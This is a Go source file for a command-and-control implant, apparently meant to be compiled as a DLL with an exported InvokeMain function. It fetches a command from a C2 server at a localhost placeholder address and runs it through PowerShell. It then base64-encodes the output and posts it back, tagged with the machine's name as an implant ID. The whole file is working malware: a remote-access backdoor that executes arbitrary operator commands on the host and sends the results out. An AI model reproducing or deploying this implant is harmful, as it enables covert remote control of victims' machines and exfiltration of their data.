package main

import (
	"C"
	"bytes"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"os/exec"
	"strings"
	"time"
)

type Command struct {
	Input        string `json:"Input"`
	ImplantUser  string `json:"ImplantUser"`
	Operator     string `json:"Operator"`
	TimeToExec   string `json:"timeToExec"`
	Delay        string `json:"delay"`
}

type Output struct {
	ImplantId    string `json:"ImplantId"`
	OperatorId   string `json:"OperatorId"`
	Output       string `json:"Output"`
	DateFromLast string `json:"DateFromLast"`
}

//export InvokeMain
func InvokeMain() {
	implantId := os.Getenv("COMPUTERNAME")

	// Fetch command from the server
	resp, err := http.Get("http://127.0.0.1:8081/fetchCommand")
	if err != nil {
		fmt.Println("Failed to fetch command.")
		return
	}

	defer resp.Body.Close()
	body, _ := ioutil.ReadAll(resp.Body)
	jsonResponse := string(body)

	// Parse command from the JSON response
	command := &Command{}
	json.Unmarshal([]byte(jsonResponse), command)

	// Execute command using powershell
	cmd := exec.Command("powershell.exe", "-Command", command.Input)
	cmdOutput := &bytes.Buffer{}
	cmd.Stdout = cmdOutput
	err = cmd.Run()
	if err != nil {
		fmt.Println("Error:", err)
		return
	}

	// Convert command output to base64
	output := cmdOutput.String()
	outputBase64 := base64.StdEncoding.EncodeToString([]byte(output))

	// Create JSON payload for the server
	outputObj := Output{
		ImplantId:    implantId,
		OperatorId:   command.Operator,
		Output:       outputBase64,
		DateFromLast: time.Now().Format(time.RFC3339),
	}

	outputJson, _ := json.Marshal(outputObj)

	// Send output to the server
	_, err = http.Post("http://127.0.0.1:8081/fetchOutput", "application/json", strings.NewReader(string(outputJson)))
	if err != nil {
		fmt.Println("Failed to send output.")
		return
	}

	fmt.Println("Output sent successfully")
}

func main() {
	// We leave main empty
}

